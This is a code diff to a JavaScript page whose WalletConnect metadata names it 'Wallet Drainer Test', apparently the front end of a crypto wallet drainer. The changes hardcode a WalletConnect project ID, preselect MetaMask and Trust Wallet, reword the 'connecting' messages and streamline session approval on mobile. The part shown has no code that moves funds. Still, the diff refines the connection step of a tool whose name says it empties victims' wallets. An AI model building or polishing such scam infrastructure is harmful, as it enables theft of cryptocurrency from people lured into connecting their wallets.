@@ -386,9 +386,9 @@ async function init() {
   let walletConnectSession = null;
 
   // Инициализация WalletConnect
-  async function initWalletConnect() {
+  async function initWalletConnect(walletType) {
     walletConnectClient = await WalletConnectSignClient.init({
-      projectId: 'YOUR_PROJECT_ID', // Замените на ваш WalletConnect Project ID
+      projectId: 'd85cc83edb401b676e2a7bcef67f3be8',
       metadata: {
         name: 'Wallet Drainer Test',
         description: 'Test DApp for wallet connection',
@@ -398,12 +398,16 @@ async function init() {
     });
 
     const walletConnectModal = new WalletConnectModal({
-      projectId: 'd85cc83edb401b676e2a7bcef67f3be8', // Замените на ваш WalletConnect Project ID
+      projectId: 'd85cc83edb401b676e2a7bcef67f3be8',
       themeMode: 'dark',
       walletImages: {
         metamask: 'https://via.placeholder.com/32',
         trust: 'https://via.placeholder.com/32'
-      }
+      },
+      explorerRecommendedWalletIds: [
+        walletType === 'metamask' ? 'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96' : 
+        walletType === 'trustwallet' ? '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2b4f27a542c0' : ''
+      ]
     });
 
     return { walletConnectClient, walletConnectModal };
@@ -452,7 +456,7 @@ async function init() {
       const displayName = selectedWalletType === 'metamask' ? 'MetaMask' : 'Trust Wallet';
       loaderTitle.innerText = displayName;
       walletLoaderTitle.innerText = `Continue in ${displayName}`;
-      walletLoaderSubtitle.innerText = isMobile ? `Opening ${displayName} to connect...` : `Accept connection request in ${displayName}`;
+      walletLoaderSubtitle.innerText = isMobile ? `Connecting to ${displayName}...` : `Accept connection request in ${displayName}`;
       walletAvatar.src = 'https://via.placeholder.com/80';
 
       walletListModal.classList.remove('show');
@@ -532,7 +536,7 @@ async function init() {
   tryAgainBtn.addEventListener('click', async () => {
     if (!selectedWalletType) return;
     const displayName = selectedWalletType === 'metamask' ? 'MetaMask' : 'Trust Wallet';
-    walletLoaderSubtitle.innerText = isMobile ? `Opening ${displayName} to connect...` : `Accept connection request in ${displayName}`;
+    walletLoaderSubtitle.innerText = isMobile ? `Connecting to ${displayName}...` : `Accept connection request in ${displayName}`;
     try {
       const { provider, accounts } = await connectWallet(selectedWalletType);
       const ethersProvider = new ethers.providers.Web3Provider(provider);
@@ -550,9 +554,9 @@ async function connectWallet(walletType) {
   const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
   if (isMobile) {
-    // Мобильное устройство: используем WalletConnect
+    // Мобильное устройство: прямое подключение через WalletConnect
     if (!walletConnectClient) {
-      const { walletConnectClient: client, walletConnectModal } = await initWalletConnect();
+      const { walletConnectClient: client, walletConnectModal } = await initWalletConnect(walletType);
       walletConnectClient = client;
       walletConnectModal.subscribeModal(state => {
         if (!state.open) {
@@ -576,14 +580,7 @@ async function connectWallet(walletType) {
         }
       });
 
-      if (uri) {
-        const walletId = walletType === 'metamask' ? 'metamask' : 'trust';
-        const deeplink = walletType === 'metamask'
-          ? `metamask://wc?uri=${encodeURIComponent(uri)}`
-          : `trust://wc?uri=${encodeURIComponent(uri)}`;
-        window.location.href = deeplink;
-      }
-
+      // Ждем одобрения сессии
       walletConnectSession = await approval();
       const provider = {
         request: async (request) => {
